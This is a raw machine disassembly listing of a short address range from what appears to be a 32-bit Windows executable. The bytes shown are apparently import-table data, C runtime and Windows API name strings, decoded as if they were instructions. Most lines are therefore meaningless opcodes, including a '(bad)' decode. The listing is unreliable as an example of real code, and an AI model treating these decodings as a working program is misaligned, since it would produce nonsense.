  41275a:	add    DWORD PTR [eax],eax
  41275c:	push   0x31
  41275e:	add    DWORD PTR [eax],eax
  412760:	js     0x412793
  412762:	add    DWORD PTR [eax],eax
  412764:	xchg   esi,eax
  412765:	xor    DWORD PTR [ecx],eax
  412767:	add    BYTE PTR [ecx+esi*1+0x31b40001],ah
  41276e:	add    DWORD PTR [eax],eax
  412770:	shl    BYTE PTR [ecx],cl
  412772:	add    DWORD PTR [eax],eax
  412774:	in     al,0x31
  412776:	add    DWORD PTR [eax],eax
  412778:	cld    
  412779:	xor    DWORD PTR [ecx],eax
  41277b:	add    BYTE PTR [edx],cl
  41277d:	xor    al,BYTE PTR [ecx]
  41277f:	add    BYTE PTR [eax],al
  412781:	add    BYTE PTR [eax],al
  412783:	add    BYTE PTR [edx+esi*1],ch
  412786:	add    DWORD PTR [eax],eax
  412788:	inc    esp
  412789:	xor    al,BYTE PTR [ecx]
  41278b:	add    BYTE PTR [esi+0x32],dl
  41278e:	add    DWORD PTR [eax],eax
  412790:	outs   dx,BYTE PTR ds:[esi]
  412791:	xor    al,BYTE PTR [ecx]
  412793:	add    BYTE PTR [eax-0x63fffece],al
  412799:	xor    al,BYTE PTR [ecx]
  41279b:	add    BYTE PTR [eax],al
  41279d:	add    BYTE PTR [eax],al
  41279f:	add    BYTE PTR [edx+esi*1+0x32d60001],bh
  4127a6:	add    DWORD PTR [eax],eax
  4127a8:	out    0x32,al
  4127aa:	add    DWORD PTR [eax],eax
  4127ac:	cli    
  4127ad:	xor    al,BYTE PTR [ecx]
  4127af:	add    BYTE PTR [edx],cl
  4127b1:	xor    eax,DWORD PTR [ecx]
  4127b3:	add    BYTE PTR [eax],ah
  4127b5:	xor    eax,DWORD PTR [ecx]
  4127b7:	add    BYTE PTR [esi],dh
  4127b9:	xor    eax,DWORD PTR [ecx]
  4127bb:	add    BYTE PTR [ebx+esi*1+0x1],al
  4127bf:	add    BYTE PTR [eax+0x33],dl
  4127c2:	add    DWORD PTR [eax],eax
  4127c4:	pop    esp
  4127c5:	xor    eax,DWORD PTR [ecx]
  4127c7:	add    BYTE PTR [esi+0x33],ah
  4127ca:	add    DWORD PTR [eax],eax
  4127cc:	je     0x412801
  4127ce:	add    DWORD PTR [eax],eax
  4127d0:	xor    BYTE PTR [ebx],0x1
  4127d3:	add    BYTE PTR [ebx+esi*1+0x33aa0001],bl
  4127da:	add    DWORD PTR [eax],eax
  4127dc:	ret    0x133
  4127df:	add    dh,dl
  4127e1:	xor    eax,DWORD PTR [ecx]
  4127e3:	add    dh,ch
  4127e5:	xor    eax,DWORD PTR [ecx]
  4127e7:	add    ah,bh
  4127e9:	xor    eax,DWORD PTR [ecx]
  4127eb:	add    BYTE PTR [esi],dl
  4127ed:	xor    al,0x1
  4127ef:	add    BYTE PTR [edx],ch
  4127f1:	xor    al,0x1
  4127f3:	add    BYTE PTR [esp+esi*1],dh
  4127f6:	add    DWORD PTR [eax],eax
  4127f8:	inc    esp
  4127f9:	xor    al,0x1
  4127fb:	add    BYTE PTR [esi+0x34],cl
  4127fe:	add    DWORD PTR [eax],eax
  412800:	pop    edx
  412801:	xor    al,0x1
  412803:	add    BYTE PTR [esi+0x34],ch
  412806:	add    DWORD PTR [eax],eax
  412808:	xchg   BYTE PTR [ecx+eax*1],dh
  41280b:	add    BYTE PTR [esp+esi*1+0x349e0001],dl
  412812:	add    DWORD PTR [eax],eax
  412814:	mov    dl,0x34
  412816:	add    DWORD PTR [eax],eax
  412818:	enter  0x134,0x0
  41281c:	fidiv  DWORD PTR [ecx+eax*1]
  41281f:	add    dh,ah
  412821:	xor    al,0x1
  412823:	add    dl,bh
  412825:	xor    al,0x1
  412827:	add    BYTE PTR [esi*1+0x350e0001],al
  41282e:	add    DWORD PTR [eax],eax
  412830:	push   ds
  412831:	xor    eax,0x35360001
  412836:	add    DWORD PTR [eax],eax
  412838:	dec    edx
  412839:	xor    eax,0x355a0001
  41283e:	add    DWORD PTR [eax],eax
  412840:	xor    ax,0x1
  412844:	je     0x41287b
  412846:	add    DWORD PTR [eax],eax
  412848:	mov    dh,BYTE PTR ds:0x359c0001
  41284e:	add    DWORD PTR [eax],eax
  412850:	add    BYTE PTR [eax],al
  412852:	add    BYTE PTR [eax],al
  412854:	mov    edx,0xce000135
  412859:	xor    eax,0x35e00001
  41285e:	add    DWORD PTR [eax],eax
  412860:	in     al,dx
  412861:	xor    eax,0x36040001
  412866:	add    DWORD PTR [eax],eax
  412868:	adc    al,0x36
  41286a:	add    DWORD PTR [eax],eax
  41286c:	sub    BYTE PTR [esi],dh
  41286e:	add    DWORD PTR [eax],eax
  412870:	ds add DWORD PTR ss:[eax],eax
  412874:	dec    esi
  412875:	add    DWORD PTR ss:[eax],eax
  412878:	pusha  
  412879:	add    DWORD PTR ss:[eax],eax
  41287c:	ins    BYTE PTR es:[edi],dx
  41287d:	add    DWORD PTR ss:[eax],eax
  412880:	xor    BYTE PTR [esi],0x1
  412883:	add    BYTE PTR [esi-0x49fffeca],bl
  412889:	add    DWORD PTR ss:[eax],eax
  41288c:	retf   0x136
  41288f:	add    dl,bl
  412891:	add    DWORD PTR ss:[eax],eax
  412894:	out    0x36,al
  412896:	add    DWORD PTR [eax],eax
  412898:	(bad)  
  412899:	add    DWORD PTR ss:[eax],eax
  41289c:	adc    BYTE PTR [edi],dh
  41289e:	add    DWORD PTR [eax],eax
  4128a0:	and    dh,BYTE PTR [edi]
  4128a2:	add    DWORD PTR [eax],eax
  4128a4:	xor    dh,BYTE PTR [edi]
  4128a6:	add    DWORD PTR [eax],eax
  4128a8:	inc    esp
  4128a9:	aaa    
  4128aa:	add    DWORD PTR [eax],eax
  4128ac:	push   eax
  4128ad:	aaa    
  4128ae:	add    DWORD PTR [eax],eax
  4128b0:	pusha  
  4128b1:	aaa    
  4128b2:	add    DWORD PTR [eax],eax
  4128b4:	outs   dx,BYTE PTR ds:[esi]
  4128b5:	aaa    
  4128b6:	add    DWORD PTR [eax],eax
  4128b8:	js     0x4128f1
  4128ba:	add    DWORD PTR [eax],eax
  4128bc:	mov    BYTE PTR [edi],dh
  4128be:	add    DWORD PTR [eax],eax
  4128c0:	xchg   esi,eax
  4128c1:	aaa    
  4128c2:	add    DWORD PTR [eax],eax
  4128c4:	test   al,0x37
  4128c6:	add    DWORD PTR [eax],eax
  4128c8:	mov    esi,0xd2000137
  4128cd:	aaa    
  4128ce:	add    DWORD PTR [eax],eax
  4128d0:	jmp    0x138:0x137
  4128d7:	add    BYTE PTR [esi],cl
  4128d9:	cmp    BYTE PTR [ecx],al
  4128db:	add    BYTE PTR [esi],ah
  4128dd:	cmp    BYTE PTR [ecx],al
  4128df:	add    BYTE PTR [eax+edi*1],bh
  4128e2:	add    DWORD PTR [eax],eax
  4128e4:	dec    esp
  4128e5:	cmp    BYTE PTR [ecx],al
  4128e7:	add    BYTE PTR [eax+0x38],bl
  4128ea:	add    DWORD PTR [eax],eax
  4128ec:	jo     0x412926
  4128ee:	add    DWORD PTR [eax],eax
  4128f0:	jle    0x41292a
  4128f2:	add    DWORD PTR [eax],eax
  4128f4:	xchg   edx,eax
  4128f5:	cmp    BYTE PTR [ecx],al
  4128f7:	add    BYTE PTR [esi-0x51fffec8],bl
  4128fd:	cmp    BYTE PTR [ecx],al
  4128ff:	add    dh,al
  412901:	cmp    BYTE PTR [ecx],al
  412903:	add    dl,bl
  412905:	cmp    BYTE PTR [ecx],al
  412907:	add    al,ch
  412909:	cmp    BYTE PTR [ecx],al
  41290b:	add    dh,bh
  41290d:	cmp    BYTE PTR [ecx],al
  41290f:	add    BYTE PTR [edx],dl
  412911:	cmp    DWORD PTR [ecx],eax
  412913:	add    BYTE PTR [esi],bl
  412915:	cmp    DWORD PTR [ecx],eax
  412917:	add    BYTE PTR [eax],bh
  412919:	cmp    DWORD PTR [ecx],eax
  41291b:	add    BYTE PTR [eax],al
  41291d:	add    BYTE PTR [eax],al
  41291f:	add    BYTE PTR [ecx+edi*1+0x1],bl
  412923:	add    BYTE PTR [edx+0x39],dh
  412926:	add    DWORD PTR [eax],eax
  412928:	add    BYTE PTR [eax],al
  41292a:	add    BYTE PTR [eax],al
  41292c:	xchg   edi,eax
  41292d:	add    ebp,DWORD PTR [ecx+0x73]
  412930:	imul   esp,DWORD PTR fs:[edi+0x69],0x41f0074
  412938:	ja     0x41299d
  41293a:	jae    0x41299f
  41293c:	ins    DWORD PTR es:[edi],dx
  41293d:	jo     0x41293f
  41293f:	add    ch,dh
  412941:	add    BYTE PTR [edi+0x63],bl
  412944:	outs   dx,DWORD PTR ds:[esi]
  412945:	outs   dx,BYTE PTR ds:[esi]
  412946:	je     0x4129ba
  412948:	outs   dx,DWORD PTR ds:[esi]
  412949:	ins    BYTE PTR es:[edi],dx
  41294a:	data16 jo 0x41294d
  41294d:	add    BYTE PTR [ebp+0x74656703],cl
  412953:	outs   dx,BYTE PTR gs:[esi]
  412955:	jbe    0x412957
  412957:	add    BYTE PTR ds:0x73637704,ch
  41295d:	jb     0x4129c2
  41295f:	push   0x3f20072
  412964:	jae    0x4129da
  412966:	jb     0x4129d6
  412968:	arpl   WORD PTR [eax+0x79],si
  41296b:	add    al,ch
  41296d:	add    esi,DWORD PTR [ebx+0x74]
  412970:	jb     0x4129d5
  412972:	jo     0x4129ed
  412974:	add    BYTE PTR [eax],al
  412976:	mov    bl,0x0
  412978:	pop    edi
  412979:	pop    edi
  41297a:	jae    0x4129e1
  41297c:	je     0x4129dd
  41297e:	popa   
  41297f:	jo     0x4129f1
  412981:	pop    edi
  412982:	je     0x4129fd
  412984:	jo     0x4129eb
  412986:	add    BYTE PTR [eax],al
  412988:	lds    eax,FWORD PTR [ebx]
  41298a:	jo     0x4129fe
  41298c:	imul   ebp,DWORD PTR [esi+0x74],0xcc000066
  412993:	add    esi,DWORD PTR [ecx+0x73]
  412996:	outs   dx,DWORD PTR ds:[esi]
  412997:	jb     0x412a0d
  412999:	add    BYTE PTR [edx+0x3],dh
  41299c:	data16 ins BYTE PTR es:[edi],dx
  41299e:	outs   dx,DWORD PTR ds:[esi]
  41299f:	outs   dx,DWORD PTR ds:[esi]
  4129a0:	jb     0x4129a2
  4129a2:	lods   al,BYTE PTR ds:[esi]
  4129a3:	add    ebp,DWORD PTR [ecx+0x73]
  4129a6:	js     0x412a0c
  4129a8:	imul   esp,DWORD PTR [edi+0x69],0xa0000074
  4129af:	add    BYTE PTR [edi+0x5f],bl
  4129b2:	jo     0x412a13
  4129b4:	pop    edi
  4129b5:	ins    WORD PTR es:[edi],dx
  4129b7:	outs   dx,DWORD PTR ds:[esi]
  4129b8:	fs add BYTE PTR gs:[eax],al
  4129bc:	xor    eax,0x73637704
  4129c1:	je     0x412a32
  4129c3:	ins    BYTE PTR es:[edi],dx
  4129c4:	add    BYTE PTR [eax],al
  4129c6:	or     al,0x4
  4129c8:	je     0x412a39
  4129ca:	ja     0x412a41
  4129cc:	jo     0x412a3e
  4129ce:	gs jb  0x4129d1
  4129d1:	add    cl,dh
  4129d3:	add    esi,DWORD PTR [ebx+0x74]
  4129d6:	jb     0x412a46
  4129d8:	arpl   WORD PTR [ebp+0x70],bp
  4129db:	add    BYTE PTR [ebx+0x705f5f00],bl
  4129e1:	pop    edi
  4129e2:	pop    edi
  4129e3:	arpl   WORD PTR [edi+0x6d],bp
  4129e6:	ins    DWORD PTR es:[edi],dx
  4129e7:	outs   dx,DWORD PTR ds:[esi]
  4129e8:	fs add BYTE PTR gs:[eax],al
  4129ec:	push   es
  4129ed:	add    al,0x74
  4129ef:	imul   ebp,DWORD PTR [ebp+0x65],0x38b0000
  4129f6:	addr16 gs je 0x412a5d
  4129fa:	add    BYTE PTR [eax],al
  4129fc:	xor    eax,DWORD PTR [edi+esi*2]
  4129ff:	arpl   WORD PTR [ebx+0x74],si
  412a02:	outs   dx,DWORD PTR ds:[esi]
  412a03:	imul   eax,DWORD PTR [eax],0x0
  412a06:	test   eax,0x77736903
  412a0b:	jae    0x412a7d
  412a0d:	popa   
  412a0e:	arpl   WORD PTR [ebp+0x0],sp
  412a11:	add    BYTE PTR [ebx+0x77736903],ch
  412a17:	js     0x412a7d
  412a19:	imul   esp,DWORD PTR [edi+0x69],0xdb0074
  412a20:	pop    edi
  412a21:	popa   
  412a22:	ins    DWORD PTR es:[edi],dx
  412a23:	jae    0x412a8c
  412a25:	pop    edi
  412a26:	gs js  0x412a92
  412a29:	je     0x412a2b
  412a2b:	add    BYTE PTR [ecx],ah
  412a2d:	add    al,0x77
  412a2f:	arpl   WORD PTR [ebx+0x63],si
  412a32:	jo     0x412aad
  412a34:	add    BYTE PTR [eax],al
  412a36:	xchg   BYTE PTR [ecx],al
  412a38:	pop    edi
  412a39:	imul   ebp,DWORD PTR [esi+0x69],0x72657474
  412a40:	ins    DWORD PTR es:[edi],dx
  412a41:	add    BYTE PTR [ebx+eax*1+0x6c617369],dl
  412a48:	outs   dx,BYTE PTR ds:[esi]
  412a49:	jne    0x412ab8
  412a4b:	add    ch,dh
  412a4d:	add    esi,DWORD PTR [ebx+0x74]
  412a50:	jb     0x412ac2
  412a52:	bound  esi,QWORD PTR [edx+0x6b]
  412a55:	add    BYTE PTR [esi+0x73695f01],bl
  412a5b:	ins    DWORD PTR es:[edi],dx
  412a5c:	bound  esp,QWORD PTR [edx+0x6c]
  412a5f:	gs popa 
  412a61:	add    BYTE PTR fs:[eax],al
  412a64:	sbb    BYTE PTR [esi+esi*2],al
  412a67:	jae    0x412ae0
  412a69:	jo     0x412add
  412a6b:	imul   ebp,DWORD PTR [esi+0x74],0x36d0066
  412a72:	data16 addr16 gs je 0x412ada
  412a77:	add    BYTE PTR [edx+0x0],dl
  412a7a:	pop    edi
  412a7b:	pop    eax
  412a7c:	arpl   WORD PTR [eax+0x74],si
  412a7f:	inc    esi
  412a80:	imul   ebp,DWORD PTR [esp+esi*2+0x65],0x4290072
  412a88:	ja     0x412aed
  412a8a:	jae    0x412afa
  412a8c:	arpl   WORD PTR [eax+0x79],si
  412a8f:	add    BYTE PTR [ebx],ah
  412a91:	add    DWORD PTR [edi+0x65],ebx
  412a94:	js     0x412aff
  412a96:	je     0x412a98
  412a98:	imul   eax,DWORD PTR [ebx],0x6f6c6366
  412a9e:	jae    0x412b05
  412aa0:	add    BYTE PTR [eax],al
  412aa2:	call   0x65a489a7
  412aa7:	js     0x412b12
  412aa9:	je     0x412aab
  412aab:	add    bh,al
  412aad:	add    esi,DWORD PTR [eax+0x75]
  412ab0:	je     0x412b15
  412ab2:	add    BYTE PTR [eax],al
  412ab4:	fadd   DWORD PTR [ebx]
  412ab6:	jae    0x412b1d
  412ab8:	je     0x412b26
  412aba:	outs   dx,DWORD PTR ds:[esi]
  412abb:	arpl   WORD PTR [ecx+0x6c],sp
  412abe:	add    BYTE PTR gs:[ebp+0x735f5f00],dh
  412ac5:	gs je  0x412b3d
  412ac8:	jae    0x412b2f
  412aca:	jb     0x412b39
  412acc:	popa   
  412acd:	je     0x412b37
  412acf:	gs jb  0x412b44
  412ad2:	add    BYTE PTR [eax],al
  412ad4:	mov    BYTE PTR [ebx],al
  412ad6:	data16 ja 0x412b4b
  412ad9:	imul   esi,DWORD PTR [ebp+eiz*2+0x0],0x7003c300
  412ae1:	gs jb  0x412b56
  412ae4:	outs   dx,DWORD PTR ds:[esi]
  412ae5:	jb     0x412ae7
  412ae7:	add    BYTE PTR [edx+0x3],bl
  412aea:	popa   
  412aeb:	je     0x412b5c
  412aed:	ins    BYTE PTR es:[edi],dx
  412aee:	add    BYTE PTR [eax],al
  412af0:	jb     0x412af2
  412af2:	pop    edi
  412af3:	pop    edi
  412af4:	addr16 gs je 0x412b65
  412af8:	popa   
  412af9:	imul   ebp,DWORD PTR [esi+0x61],0x736772
  412b00:	sub    BYTE PTR [edi+esi*2],al
  412b03:	arpl   WORD PTR [ebx+0x6e],si
  412b06:	arpl   WORD PTR [ebp+0x70],bp
  412b09:	add    dl,dl
  412b0b:	add    esi,DWORD PTR [edx+0x65]
  412b0e:	ins    DWORD PTR es:[edi],dx
  412b0f:	outs   dx,DWORD PTR ds:[esi]
  412b10:	jbe    0x412b77
  412b12:	add    BYTE PTR [eax],al
  412b14:	dec    ebp
  412b15:	push   ebx
  412b16:	push   esi
  412b17:	inc    ebx
  412b18:	push   edx
  412b19:	push   esp
  412b1a:	cs fs ins BYTE PTR es:[edi],dx
  412b1d:	ins    BYTE PTR es:[edi],dx
  412b1e:	add    BYTE PTR [eax],al
  412b20:	mov    edi,0x636f4c01
  412b25:	imul   edx,DWORD PTR [edi+0x69],0x6e
  412b29:	outs   dx,DWORD PTR fs:[esi]
  412b2b:	ja     0x412b82
  412b2d:	jo     0x412b93
  412b2f:	popa   
  412b30:	je     0x412b97
  412b32:	add    BYTE PTR [eax],al
  412b34:	nop
  412b35:	add    dl,BYTE PTR [edx+esi*2+0x61]
  412b39:	arpl   WORD PTR [ebx+0x50],bp
  412b3c:	outs   dx,DWORD PTR ds:[esi]
  412b3d:	jo     0x412bb4
  412b3f:	jo     0x412b8e
  412b41:	outs   dx,BYTE PTR gs:[esi]
  412b43:	jne    0x412b45
  412b45:	add    BYTE PTR [eax],bh
  412b47:	add    dl,BYTE PTR [ebx+0x65]
  412b4a:	je     0x412b8f
  412b4c:	jne    0x412bc0
  412b4e:	jae    0x412bbf
  412b50:	jb     0x412b52
  412b52:	mov    eax,ds:0x57734901
  412b57:	imul   ebp,DWORD PTR [esi+0x64],0x6e45776f
  412b5e:	popa   
  412b5f:	bound  ebp,QWORD PTR [ebp+eiz*2+0x64]
  412b63:	add    BYTE PTR [ecx+0x536e4901],al
  412b69:	outs   dx,BYTE PTR gs:[esi]
  412b6b:	fs dec ebp
  412b6d:	gs jae 0x412be3
  412b70:	popa   
  412b71:	addr16 gs inc ebp
  412b74:	js     0x412b76
  412b76:	xchg   ebx,eax
  412b77:	add    BYTE PTR [ebp+eiz*2+0x73],al
  412b7b:	je     0x412bef
  412b7d:	outs   dx,DWORD PTR ds:[esi]
  412b7e:	jns    0x412bc1
  412b80:	arpl   WORD PTR [ebx+0x65],sp
  412b83:	ins    BYTE PTR es:[edi],dx
  412b84:	gs jb  0x412be8
  412b87:	je     0x412bf8
  412b89:	jb     0x412bdf
  412b8b:	popa   
  412b8c:	bound  ebp,QWORD PTR [ebp+eiz*2+0x0]
  412b90:	adc    eax,DWORD PTR [ecx]
  412b92:	inc    edi
  412b93:	gs je  0x412bda
  412b96:	outs   dx,DWORD PTR ds:[esi]
  412b97:	jne    0x412bfb
  412b99:	ins    BYTE PTR es:[edi],dx
  412b9a:	gs inc ebx
  412b9c:	ins    BYTE PTR es:[edi],dx
  412b9d:	imul   esp,DWORD PTR [ebx+0x6b],0x656d6954
  412ba4:	add    BYTE PTR [eax],al
  412ba6:	mov    ds:0x57734901,eax
  412bab:	imul   ebp,DWORD PTR [esi+0x64],0x6956776f
  412bb2:	jae    0x412c1d
  412bb4:	bound  ebp,QWORD PTR [ebp+eiz*2+0x0]
  412bb8:	mov    al,0x1
  412bba:	dec    esp
  412bbb:	outs   dx,DWORD PTR ds:[esi]
  412bbc:	popa   
  412bbd:	fs dec ecx
  412bbf:	arpl   WORD PTR [edi+0x6e],bp
  412bc2:	push   edi
  412bc3:	add    BYTE PTR [ebp+0x79656b02],bh
  412bc9:	bound  esp,QWORD PTR [edi+ebx*2+0x65]
  412bcd:	jbe    0x412c34
  412bcf:	outs   dx,BYTE PTR ds:[esi]
  412bd0:	je     0x412bd2
  412bd2:	test   eax,0x616f4c01
  412bd7:	fs inc edx
  412bd9:	imul   esi,DWORD PTR [ebp+ebp*2+0x61],0x58004170
  412be1:	add    dl,BYTE PTR [ebx+0x65]
  412be4:	je     0x412c38
  412be6:	arpl   WORD PTR gs:[eax+eax*1-0x1e],si
  412beb:	add    BYTE PTR [esi+0x69],al
  412bee:	outs   dx,BYTE PTR ds:[esi]
  412bef:	fs push edi
  412bf1:	imul   ebp,DWORD PTR [esi+0x64],0x7845776f
  412bf8:	inc    ecx
  412bf9:	add    cl,bh
  412bfb:	add    BYTE PTR [edi+0x65],al
  412bfe:	je     0x412c43
  412c00:	ins    BYTE PTR es:[edi],dx
  412c01:	popa   
  412c02:	jae    0x412c77
  412c04:	dec    esp
  412c05:	outs   dx,DWORD PTR ds:[esi]
  412c06:	outs   dx,BYTE PTR ds:[esi]
  412c07:	addr16 push edi
  412c09:	add    BYTE PTR ds:0x6e655302,ah
  412c0f:	fs dec ecx
  412c11:	outs   dx,BYTE PTR ds:[esi]
  412c12:	jo     0x412c89
  412c14:	je     0x412c16
  412c16:	cdq    
  412c17:	add    BYTE PTR [ecx+ebp*2+0x61],al
  412c1b:	ins    BYTE PTR es:[edi],dx
  412c1c:	outs   dx,DWORD PTR ds:[esi]
  412c1d:	addr16 inc edx
  412c1f:	outs   dx,DWORD PTR ds:[esi]
  412c20:	js     0x412c6b
  412c22:	outs   dx,BYTE PTR ds:[esi]
  412c23:	imul   esi,DWORD PTR fs:[edx+0x65],0x61507463
  412c2b:	jb     0x412c8e
  412c2d:	ins    DWORD PTR es:[edi],dx
  412c2e:	inc    ecx
  412c2f:	add    BYTE PTR [edi+0x70737702],bh
  412c35:	jb     0x412ca0
  412c37:	outs   dx,BYTE PTR ds:[esi]
  412c38:	je     0x412ca0
  412c3a:	inc    ecx
  412c3b:	add    BYTE PTR [ecx+eax*1+0x68437349],dl
  412c42:	imul   ebp,DWORD PTR [esp+eiz*2+0x0],0x654700f8
  412c4a:	je     0x412c8f
  412c4c:	ins    BYTE PTR es:[edi],dx
  412c4d:	popa   
  412c4e:	jae    0x412cc3
  412c50:	dec    esp
  412c51:	outs   dx,DWORD PTR ds:[esi]
  412c52:	outs   dx,BYTE PTR ds:[esi]
  412c53:	addr16 inc ecx
  412c55:	add    BYTE PTR [ecx+eax*1+0x63497349],bl
  412c5c:	outs   dx,DWORD PTR ds:[esi]
  412c5d:	outs   dx,BYTE PTR ds:[esi]
  412c5e:	imul   esp,DWORD PTR [ebx+0x0],0x47014200
  412c65:	gs je  0x412cb6
  412c68:	gs js  0x412cdf
  412c6b:	inc    esp
  412c6c:	ins    BYTE PTR es:[edi],dx
  412c6d:	addr16 inc edi
  412c6f:	jb     0x412ce0
  412c71:	jne    0x412ce3
  412c73:	dec    ecx
  412c74:	je     0x412cdb
  412c76:	ins    DWORD PTR es:[edi],dx
  412c77:	add    BYTE PTR [ebx+0x61724400],dh
  412c7d:	ja     0x412cc8
  412c7f:	arpl   WORD PTR [edi+0x6e],bp
  412c82:	add    BYTE PTR [eax],al
  412c84:	jmp    0x65b17b8a
  412c89:	outs   dx,BYTE PTR ds:[esi]
  412c8a:	dec    ecx
  412c8b:	outs   dx,BYTE PTR ds:[esi]
  412c8c:	jo     0x412d03
  412c8e:	je     0x412cd4
  412c90:	gs jae 0x412cfe
  412c93:	je     0x412d04
  412c95:	jo     0x412c97
  412c97:	add    dh,bh
  412c99:	add    BYTE PTR [edi+0x65],al
  412c9c:	je     0x412ce1
  412c9e:	ins    BYTE PTR es:[edi],dx
  412c9f:	imul   esi,DWORD PTR [eax+0x43],0x6f737275
  412ca6:	jb     0x412ca8
  412ca8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412ca9:	add    DWORD PTR [ecx+0x73],ecx
  412cac:	pop    edx
  412cad:	outs   dx,DWORD PTR ds:[esi]
  412cae:	outs   dx,DWORD PTR ds:[esi]
  412caf:	ins    DWORD PTR es:[edi],dx
  412cb0:	gs add BYTE PTR fs:[eax],al
  412cb4:	rol    DWORD PTR [eax],0x45
  412cb7:	outs   dx,BYTE PTR ds:[esi]
  412cb8:	popa   
  412cb9:	bound  ebp,QWORD PTR [ebp+eiz*2+0x57]
  412cbd:	imul   ebp,DWORD PTR [esi+0x64],0x776f
  412cc4:	sub    BYTE PTR [eax],al
  412cc6:	inc    ebx
  412cc7:	push   0x6f4c7261
  412ccc:	ja     0x412d33
  412cce:	jb     0x412d12
  412cd0:	jne    0x412d38
  412cd2:	push   di
  412cd4:	add    BYTE PTR [eax],al
  412cd6:	inc    ebx
  412cd7:	add    BYTE PTR [ebx+0x6c],al
  412cda:	imul   esp,DWORD PTR [ebp+0x6e],0x536f5474
  412ce1:	arpl   WORD PTR [edx+0x65],si
  412ce4:	outs   dx,BYTE PTR gs:[esi]
  412ce6:	add    BYTE PTR [eax],al
  412ce8:	add    eax,DWORD PTR [eax]
  412cea:	inc    ecx
  412ceb:	fs push 0x75
  412cee:	jae    0x412d64
  412cf0:	push   edi
  412cf1:	imul   ebp,DWORD PTR [esi+0x64],0x6552776f
  412cf8:	arpl   WORD PTR [ebp+eax*2+0x78],si
  412cfc:	add    BYTE PTR [eax],al
  412cfe:	icebp  
  412cff:	add    DWORD PTR [eax+0x6f],edx
  412d02:	jae    0x412d78
  412d04:	dec    ebp
  412d05:	gs jae 0x412d7b
  412d08:	popa   
  412d09:	addr16 gs inc ecx
  412d0c:	add    BYTE PTR [eax],al
  412d0e:	out    dx,al
  412d0f:	add    DWORD PTR [eax+0x65],edx
  412d12:	imul   ecx,DWORD PTR gs:[ebp+0x65],0x73
  412d17:	jae    0x412d7a
  412d19:	addr16 gs inc ecx
  412d1c:	add    BYTE PTR [eax],al
  412d1e:	dec    ebx
  412d1f:	add    DWORD PTR [edi+0x65],eax
  412d22:	je     0x412d74
  412d24:	jb     0x412d95
  412d26:	jo     0x412d7f
  412d28:	add    BYTE PTR [eax],al
  412d2a:	inc    esi
  412d2b:	add    BYTE PTR [ebx+0x6c],al
  412d2e:	outs   dx,DWORD PTR ds:[esi]
  412d2f:	jae    0x412d96
  412d31:	inc    esp
  412d32:	gs jae 0x412da0
  412d35:	je     0x412da6
  412d37:	jo     0x412d39
  412d39:	add    cl,cl
  412d3b:	add    DWORD PTR [ebp+0x61],ecx
  412d3e:	jo     0x412d97
  412d40:	imul   ebp,DWORD PTR [esi+0x64],0x6f50776f
  412d47:	imul   ebp,DWORD PTR [esi+0x74],0x2020073
  412d4e:	push   edx
  412d4f:	imul   esi,DWORD PTR gs:[bp+di+0x74],0x6c437265
  412d58:	popa   
  412d59:	jae    0x412dce
  412d5b:	inc    ecx
  412d5c:	add    BYTE PTR [eax],al
  412d5e:	mov    es,WORD PTR [ecx]
  412d60:	dec    ecx
  412d61:	jae    0x412da6
  412d63:	push   0x6c417261
  412d68:	jo     0x412dd2
  412d6a:	popa   
  412d6b:	dec    esi
  412d6c:	jne    0x412ddb
  412d6e:	gs jb  0x412dda
  412d71:	arpl   WORD PTR [edi+0x0],dx
  412d74:	mov    cl,0x1
  412d76:	dec    esp
  412d77:	outs   dx,DWORD PTR ds:[esi]
  412d78:	popa   
  412d79:	fs dec ecx
  412d7b:	ins    DWORD PTR es:[edi],dx
  412d7c:	popa   
  412d7d:	addr16 gs inc ecx
  412d80:	add    BYTE PTR [eax],al
  412d82:	sahf   
  412d83:	add    DWORD PTR [ecx+0x73],ecx
  412d86:	push   edx
  412d87:	arpl   WORD PTR gs:[ebp+eax*2+0x6d],si
  412d8c:	jo     0x412e02
  412d8e:	jns    0x412d90
  412d90:	mov    es,WORD PTR [edx]
  412d92:	push   esp
  412d93:	outs   dx,DWORD PTR ds:[esi]
  412d94:	push   ebp
  412d95:	outs   dx,BYTE PTR ds:[esi]
  412d96:	imul   esp,DWORD PTR [ebx+0x6f],0x78456564
  412d9d:	add    BYTE PTR [ebx],bh
  412d9f:	add    DWORD PTR [edi+0x65],eax
  412da2:	je     0x412df1
  412da4:	gs jae 0x412e1a
  412da7:	popa   
  412da8:	addr16 gs inc ebp
  412dab:	js     0x412e21
  412dad:	jb     0x412e10
  412daf:	dec    ecx
  412db0:	outs   dx,BYTE PTR ds:[esi]
  412db1:	outs   dx,WORD PTR ds:[esi]
  412db3:	add    BYTE PTR [ebp+0x1],al
  412db6:	inc    edi
  412db7:	gs je  0x412e0a
  412dba:	popa   
  412dbb:	jb     0x412e22
  412dbd:	outs   dx,BYTE PTR ds:[esi]
  412dbe:	je     0x412dc0
  412dc0:	bound  eax,QWORD PTR [eax]
  412dc2:	inc    ebx
  412dc3:	jb     0x412e2a
  412dc5:	popa   
  412dc6:	je     0x412e2d
  412dc8:	push   edi
  412dc9:	imul   ebp,DWORD PTR [esi+0x64],0x7845776f
  412dd0:	inc    ecx
  412dd1:	add    BYTE PTR [ecx+0x766e4901],cl
  412dd7:	popa   
  412dd8:	ins    BYTE PTR es:[edi],dx
  412dd9:	imul   esp,DWORD PTR [ecx+eiz*2+0x74],0x63655265
  412de1:	je     0x412de3
  412de3:	add    BYTE PTR [ebp+0x2],ch
  412de6:	push   ebx
  412de7:	gs je  0x412e41
  412dea:	imul   ebp,DWORD PTR [esi+0x64],0x6f4c776f
  412df1:	outs   dx,BYTE PTR ds:[esi]
  412df2:	addr16 inc ecx
  412df4:	add    BYTE PTR [eax],al
  412df6:	adc    eax,0x6c655202
  412dfb:	gs popa 
  412dfd:	jae    0x412e64
  412dff:	inc    esp
  412e00:	inc    ebx
  412e01:	add    BYTE PTR [eax+eax*1],ah
  412e04:	inc    ebx
  412e05:	push   0x65676e61
  412e0a:	dec    ebp
  412e0b:	outs   dx,BYTE PTR gs:[esi]
  412e0d:	jne    0x412e66
  412e0f:	add    BYTE PTR [ebx],bh
  412e11:	add    BYTE PTR [ebx+0x68],al
  412e14:	arpl   WORD PTR gs:[ebx+0x4d],bp
  412e18:	outs   dx,BYTE PTR gs:[esi]
  412e1a:	jne    0x412e65
  412e1c:	je     0x412e83
  412e1e:	ins    DWORD PTR es:[edi],dx
  412e1f:	add    al,ch
  412e21:	add    DWORD PTR [edi+0x70],ecx
  412e24:	outs   dx,BYTE PTR gs:[esi]
  412e26:	dec    ecx
